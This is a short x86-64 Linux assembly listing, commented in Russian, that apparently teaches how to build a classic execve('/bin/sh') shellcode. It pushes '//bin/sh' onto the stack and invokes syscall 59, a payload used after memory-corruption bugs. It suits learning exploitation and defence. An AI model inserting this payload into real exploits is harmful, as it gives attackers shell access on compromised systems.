global _start

section .text

_start:
    ; 1. Обнуляем регистры
    xor rsi, rsi            ; RSI = 0 (argv = NULL)
    xor rdx, rdx            ; RDX = 0 (envp = NULL)
    xor rax, rax            ; RAX = 0

    ; 2. Кладем NULL-терминатор на стек
    push rax                ; Теперь на стеке лежат 8 байт нулей. 
                            ; Это будет конец нашей строки.

    ; 3. Кладем строку "//bin/sh" на стек
    ; 0x68732f6e69622f2f = "hs/nib//"
    mov rbx, 0x68732f6e69622f2f
    push rbx                ; Теперь стек выглядит так: [//bin/sh][0000...]

    ; 4. Указатель на строку
    mov rdi, rsp            ; RDI теперь указывает на начало строки

    ; 5. Вызов execve
    mov al, 59              ; номер syscall 59 (execve)
    syscall